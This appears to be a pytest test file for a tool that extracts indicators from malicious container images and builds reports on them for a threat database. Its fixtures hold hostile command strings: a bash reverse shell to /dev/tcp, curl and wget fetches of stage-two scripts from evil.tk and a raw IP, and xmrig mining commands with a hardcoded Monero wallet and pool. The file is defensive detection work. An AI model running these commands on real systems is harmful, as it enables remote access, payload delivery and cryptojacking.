"""Tests for the OSM submission module (osm_submit.py)."""

from __future__ import annotations

import json
import sqlite3

import pytest

from knorr.osm_submit import (
    _clean,
    _locus,
    _tags,
    build_report,
    confidence,
    extract_iocs,
    has_literal_command_wallet,
    is_byo_tool,
    novel_for_submission,
    severity_level,
)
from knorr.db import Database
from knorr.models import DetectionMethod, FindingStatus, ImageFinding


# ---------------------------------------------------------------------------
# extract_iocs (the osm_submit variant — confirming dicts only)
# ---------------------------------------------------------------------------

def test_extract_iocs_pool():
    conf = [{"evidence": "stratum+tcp://pool.supportxmr.com:3333"}]
    iocs = extract_iocs(conf)
    assert any("supportxmr" in p for p in iocs["pools"])


def test_extract_iocs_xmr_wallet():
    wallet = "43ZR6AzgXtE2B9HzNAFqTQE7ZdBCsTVWyTtQdHoPhQ6N3SPfJVzTkLrYgXaiqsS8jZ1jEkN3BCRVeJNqV6D3H5DmBb5HAxy"
    conf = [{"evidence": wallet}]
    iocs = extract_iocs(conf)
    assert wallet in iocs["wallets"]


def test_extract_iocs_wallet_flag():
    conf = [{"evidence": "--user=WALLETADDRESSVALID123456789012345678901234"}]
    iocs = extract_iocs(conf)
    assert any("WALLETADDRESSVALID" in w for w in iocs["wallets"])


def test_extract_iocs_c2_host():
    conf = [{"evidence": "curl http://evil.tk/stage2"}]
    iocs = extract_iocs(conf)
    assert any("evil.tk" in h for h in iocs["c2"])


def test_extract_iocs_raw_ip_c2():
    conf = [{"evidence": "wget http://10.0.0.99/mal.sh"}]
    iocs = extract_iocs(conf)
    assert any("10.0.0.99" in h for h in iocs["c2"])


def test_extract_iocs_miner():
    conf = [{"evidence": "/usr/bin/xmrig --config=/etc/xmrig/config.json"}]
    iocs = extract_iocs(conf)
    assert "xmrig" in iocs["miners"]


def test_extract_iocs_coin_monero():
    conf = [
        {"evidence": "stratum+tcp://xmr.pool.com:3333"},
        {"evidence": "43ZR6AzgXtE2B9HzNAFqTQE7ZdBCsTVWyTtQdHoPhQ6N3SPfJVzTkLrYgXaiqsS8jZ1jEkN3BCRVeJNqV6D3H5DmBb5HAxy"},
    ]
    iocs = extract_iocs(conf)
    assert iocs["coin"] == "Monero (XMR)"


def test_extract_iocs_pool_not_in_c2():
    """A pool host must NOT also appear in the c2 list."""
    conf = [{"evidence": "stratum+tcp://pool.supportxmr.com:3333"}]
    iocs = extract_iocs(conf)
    assert not any("supportxmr" in h for h in iocs["c2"])


def test_extract_iocs_empty():
    iocs = extract_iocs([])
    assert iocs["pools"] == []
    assert iocs["wallets"] == []
    assert iocs["c2"] == []
    assert iocs["miners"] == []
    assert iocs["coin"] is None


# ---------------------------------------------------------------------------
# is_byo_tool
# ---------------------------------------------------------------------------

def test_is_byo_tool_env_var_wallet():
    conf = [{"evidence": "xmrig --user=$WALLET --url=$POOL"}]
    assert is_byo_tool(conf) is True


def test_is_byo_tool_dollar_braces():
    conf = [{"evidence": "./xmrig -u ${XMR_WALLET} -o ${POOL}"}]
    assert is_byo_tool(conf) is True


def test_is_byo_tool_windows_env():
    conf = [{"evidence": "xmrig.exe --user=%WALLET% --url=%POOL%"}]
    assert is_byo_tool(conf) is True


def test_is_byo_tool_false_hardcoded():
    """A hardcoded pool/wallet is NOT a BYO tool."""
    conf = [{"evidence": "xmrig --user=43ZR6AzgXtE2B9HzNAFqTQE7 --url=pool.supportxmr.com"}]
    assert is_byo_tool(conf) is False


def test_is_byo_tool_empty():
    assert is_byo_tool([]) is False


# ---------------------------------------------------------------------------
# has_literal_command_wallet
# ---------------------------------------------------------------------------

def test_has_literal_command_wallet_true():
    conf = [{"evidence": "xmrig --wallet=43ZR6AzgXtE2B9HzNAFqTQE7ZdBCsTVWyTtQdHoPhQ6N3SPfJVzTkLrYgXaiqsS8jZ1jEkN3BCRVeJNqV6D3H5DmBb5HAxy"}]
    assert has_literal_command_wallet(conf) is True


def test_has_literal_command_wallet_user_flag():
    conf = [{"evidence": "./xmrig -u ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefgh"}]
    assert has_literal_command_wallet(conf) is True


def test_has_literal_command_wallet_env_var():
    """ENV var wallets do NOT count as a literal command wallet."""
    conf = [{"evidence": "xmrig --user=$WALLET"}]
    assert has_literal_command_wallet(conf) is False


def test_has_literal_command_wallet_empty():
    assert has_literal_command_wallet([]) is False


# ---------------------------------------------------------------------------
# confidence
# ---------------------------------------------------------------------------

def _row(tier="A:cryptojacking", pull_count=100, detection_method="hub_search"):
    return {"tier": tier, "pull_count": pull_count, "detection_method": detection_method}


def test_confidence_byo_tool():
    conf = [{"evidence": "xmrig --user=$WALLET --url=$POOL"}]
    assert confidence(_row(), conf) == "byo"


def test_confidence_high_hardcoded_wallet():
    conf = [{"evidence": "xmrig --wallet=43ZR6AzgXtE2B9HzNAFqTQE7ZdBCsTVWyTtQdHoPhQ6N3SPfJVzTkLrYgXaiqsS8jZ1jEkN3BCRVeJNqV6D3H5DmBb5HAxy"}]
    assert confidence(_row(pull_count=1000), conf) == "high"


def test_confidence_review_high_pull_count():
    """A hardcoded wallet with > 1M pulls goes to review (gray area)."""
    conf = [{"evidence": "xmrig --wallet=43ZR6AzgXtE2B9HzNAFqTQE7ZdBCsTVWyTtQdHoPhQ6N3SPfJVzTkLrYgXaiqsS8jZ1jEkN3BCRVeJNqV6D3H5DmBb5HAxy"}]
    assert confidence(_row(pull_count=5_000_000), conf) == "review"


def test_confidence_high_tier_a_non_crypto():
    conf = [{"evidence": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}]
    row = _row(tier="A:reverse_shell")
    assert confidence(row, conf) == "high"


def test_confidence_review_tier_b():
    conf = [{"evidence": "some corroborated evidence"}]
    row = _row(tier="B:steal-and-send")
    assert confidence(row, conf) == "review"


def test_confidence_review_no_literal_wallet():
    """crypto tier but no literal wallet → review."""
    conf = [{"evidence": "xmrig --pool=pool.supportxmr.com"}]
    assert confidence(_row(), conf) == "review"


# ---------------------------------------------------------------------------
# _locus
# ---------------------------------------------------------------------------

def test_locus_layer_file():
    conf = [{"evidence": "usr/local/bin/miner: xmrig"}]
    assert "layer file" in _locus(conf)
    assert "usr/local/bin/miner" in _locus(conf)


def test_locus_entrypoint():
    conf = [{"evidence": "xmrig --user=WALLET"}]
    assert "ENTRYPOINT" in _locus(conf)


def test_locus_empty():
    assert "ENTRYPOINT" in _locus([])


# ---------------------------------------------------------------------------
# severity_level
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("tier,expected", [
    ("A:cryptojacking", "high"),
    ("A:reverse_shell", "critical"),
    ("A:c2", "critical"),
    ("B:steal-and-send", "high"),
    ("A:container_escape", "critical"),
    ("A:obfuscation", "high"),
    ("B:persistent-dropper", "high"),
])
def test_severity_level(tier, expected):
    row = {"tier": tier}
    assert severity_level(row) == expected


# ---------------------------------------------------------------------------
# _clean
# ---------------------------------------------------------------------------

def test_clean_removes_em_dash():
    assert "," in _clean("foo — bar")


def test_clean_removes_separator_dashes():
    result = _clean("confirmed at Tier-1 -- evidence")
    assert " -- " not in result


def test_clean_preserves_flag_dashes():
    """--user (no surrounding spaces) is a flag, not a separator: keep it."""
    result = _clean("xmrig --user=abc")
    assert "--user" in result


def test_clean_collapses_whitespace():
    assert "  " not in _clean("a  b   c")


def test_clean_non_string():
    assert _clean(None) is None


# ---------------------------------------------------------------------------
# _tags
# ---------------------------------------------------------------------------

def test_tags_crypto():
    row = {"tier": "A:cryptojacking", "attribution": None}
    iocs = {"miners": ["xmrig"], "coin": "Monero (XMR)", "pools": [], "wallets": []}
    tags = _tags(row, iocs)
    assert "container" in tags
    assert "cryptominer" in tags
    assert "monero" in tags
    assert "xmrig" in tags


def test_tags_attribution():
    row = {"tier": "A:cryptojacking", "attribution": "teamtnt"}
    iocs = {"miners": [], "coin": None, "pools": [], "wallets": []}
    tags = _tags(row, iocs)
    assert "teamtnt" in tags


def test_tags_max_12():
    row = {"tier": "A:cryptojacking", "attribution": "teamtnt"}
    iocs = {"miners": ["xmrig"] * 10, "coin": "Monero (XMR)", "pools": [], "wallets": []}
    assert len(_tags(row, iocs)) <= 12


def test_tags_no_duplicates():
    row = {"tier": "A:cryptojacking", "attribution": None}
    iocs = {"miners": ["xmrig"], "coin": None, "pools": [], "wallets": []}
    tags = _tags(row, iocs)
    assert len(tags) == len(set(tags))


# ---------------------------------------------------------------------------
# build_report
# ---------------------------------------------------------------------------

def _make_row(**kw):
    """Build a sqlite3.Row-like dict with all image_findings columns."""
    defaults = {
        "image": "evil/miner",
        "reference": "latest",
        "digest": "sha256:abc123",
        "detection_method": "hub_search",
        "status": "confirmed",
        "score": 14,
        "tier": "A:cryptojacking",
        "publisher": "evil",
        "pull_count": 50000,
        "osm_severity": None,
        "osm_tags": "[]",
        "attribution": "teamtnt",
        "confirming": json.dumps([
            {"category": "cryptomining", "rule": "miner-binary",
             "evidence": "xmrig --user=43ZR6AzgXtE2B9HzNAFqTQE7ZdBCsTVWyTtQdHoPhQ6N3SPfJVzTkLrYgXaiqsS8jZ1jEkN3BCRVeJNqV6D3H5DmBb5HAxy"},
            {"category": "cryptomining", "rule": "mining-pool",
             "evidence": "stratum+tcp://pool.supportxmr.com:3333"},
        ]),
        "evidence": json.dumps({"iocs": {"pools": ["pool.supportxmr.com:3333"], "wallets": []}}),
        "first_seen_run": "hunt-20260701T120000Z",
        "last_seen_run": "hunt-20260707T180000Z",
        "signals": '["cryptomining/miner-binary","cryptomining/mining-pool"]',
        "reasoning": "confirmed at Tier-1",
    }
    defaults.update(kw)
    # Build a real sqlite3.Row-like object via sqlite3 itself
    conn = sqlite3.connect(":memory:")
    conn.row_factory = sqlite3.Row
    conn.execute(
        "CREATE TABLE t (" + ", ".join(f"{k} TEXT" for k in defaults) + ")")
    conn.execute(
        "INSERT INTO t VALUES (" + ",".join("?" * len(defaults)) + ")",
        list(defaults.values()))
    return conn.execute("SELECT * FROM t").fetchone()


def test_build_report_structure():
    row = _make_row()
    report = build_report(row)
    assert report["report_type"] == "container"
    assert report["registry"] == "dockerhub"
    assert report["resource_identifier"] == "evil/miner"
    assert "threat_description" in report
    assert "payload_description" in report
    assert isinstance(report["tags"], list)
    assert "container" in report["tags"]
    assert int(report["download_count"]) == 50000
    assert report["first_seen"] == "2026-07-01T12:00:00Z"
    assert report["last_seen"] == "2026-07-07T18:00:00Z"


def test_build_report_version_info_digest():
    row = _make_row(digest="sha256:deadbeef")
    report = build_report(row)
    assert report["version_info"] == "sha256:deadbeef"


def test_build_report_version_info_fallback_tag():
    row = _make_row(digest="")
    report = build_report(row)
    assert report["version_info"] == "latest"


def test_build_report_indicators():
    row = _make_row()
    report = build_report(row)
    assert "indicators" in report


def test_build_report_no_pull_count():
    row = _make_row(pull_count=None)
    report = build_report(row)
    assert "download_count" not in report


def test_build_report_sbom_hits():
    evidence = json.dumps({"sbom_hits": [
        {"ecosystem": "npm", "name": "evil-pkg", "version": "1.0.0"}
    ]})
    row = _make_row(evidence=evidence)
    report = build_report(row)
    assert "malicious_dependencies" in report
    assert "npm:evil-pkg@1.0.0" in report["malicious_dependencies"]


# ---------------------------------------------------------------------------
# novel_for_submission
# ---------------------------------------------------------------------------

@pytest.fixture
def submit_db(tmp_path):
    db = Database.open(tmp_path / "submit.sqlite")
    yield db
    db.close()


def _insert_confirmed(db, image, tier, detection_method, confirming, pull_count=100):
    f = ImageFinding(
        image=image,
        status=FindingStatus.CONFIRMED,
        tier=tier,
        detection_method=DetectionMethod(detection_method),
        publisher=image.split("/")[0],
        pull_count=pull_count,
    )
    f.confirming = confirming
    import json
    db.conn.execute(
        "INSERT OR REPLACE INTO image_findings "
        "(image, reference, digest, detection_method, status, score, signals, reasoning, "
        "publisher, pull_count, osm_severity, osm_tags, attribution, tier, confirming, "
        "evidence, first_seen_run, last_seen_run) VALUES "
        "(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (image, "latest", None, str(f.detection_method), "confirmed", 10,
         "[]", "", f.publisher, pull_count, None, "[]", None, tier,
         json.dumps(confirming), "{}", "run-1", "run-1"))
    db.conn.commit()


def test_novel_for_submission_high_bucket(submit_db):
    _insert_confirmed(
        submit_db, "evil/miner", "A:reverse_shell", "hub_search",
        [{"category": "reverse_shell", "rule": "bash-tcp",
          "evidence": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}])
    buckets = novel_for_submission(submit_db)
    assert any(r["image"] == "evil/miner" for r in buckets["high"])


def test_novel_for_submission_excludes_osm_container(submit_db):
    """OSM-flagged leads are excluded (OSM already has them)."""
    _insert_confirmed(
        submit_db, "known/miner", "A:cryptojacking", "osm_container",
        [{"category": "cryptomining", "rule": "miner-binary", "evidence": "xmrig"}])
    buckets = novel_for_submission(submit_db)
    all_images = [r["image"] for bucket in buckets.values() for r in bucket]
    assert "known/miner" not in all_images


def test_novel_for_submission_excludes_already_in_osm_live(submit_db):
    _insert_confirmed(
        submit_db, "already/inOSM", "A:reverse_shell", "hub_search",
        [{"evidence": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}])
    buckets = novel_for_submission(submit_db, osm_live={"already/inosm"})
    all_images = [r["image"] for bucket in buckets.values() for r in bucket]
    assert "already/inOSM" not in all_images


def test_novel_for_submission_excludes_no_confirming(submit_db):
    """A confirmed image with no confirming evidence is not submittable."""
    _insert_confirmed(submit_db, "no/proof", "A:cryptojacking", "hub_search", [])
    buckets = novel_for_submission(submit_db)
    all_images = [r["image"] for bucket in buckets.values() for r in bucket]
    assert "no/proof" not in all_images


def test_novel_for_submission_byo_bucket(submit_db):
    _insert_confirmed(
        submit_db, "tool/miner", "A:cryptojacking", "hub_search",
        [{"evidence": "xmrig --user=$WALLET --url=$POOL"}])
    buckets = novel_for_submission(submit_db)
    assert any(r["image"] == "tool/miner" for r in buckets["byo"])
